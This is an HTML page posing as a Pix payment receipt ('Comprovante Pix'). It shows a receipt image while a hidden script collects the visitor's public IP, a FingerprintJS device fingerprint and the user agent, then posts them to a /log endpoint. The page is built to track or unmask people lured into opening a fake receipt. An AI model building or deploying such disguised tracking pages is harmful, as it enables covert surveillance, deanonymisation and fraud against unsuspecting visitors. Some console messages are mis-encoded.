<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <script
  async
  src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"
></script>

<script>
  console.log("üü° Script carregado... preparando rastreamento");

  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(ipData => {
      console.log("üåç IP detectado:", ipData);

      FingerprintJS.load()
        .then(fp => fp.get())
        .then(result => {
          const visitorId = result.visitorId;
          const device = navigator.userAgent;

          console.log("üß† Fingerprint:", visitorId);

          fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip: ipData.ip,
              visitorId,
              userAgent: device,
              device
            })
          })
            .then(r => {
              if (r.ok) {
                console.log("‚úÖ Dados enviados com sucesso");
              } else {
                console.warn("‚ö†Ô∏è Problema ao enviar dados:", r.status);
              }
            })
            .catch(err => console.error("‚ùå Falha no envio:", err));
        })
        .catch(err => console.error("‚ùå FingerprintJS falhou:", err));
    })
    .catch(err => console.error("‚ùå Falha ao obter IP:", err));
</script>

</html>
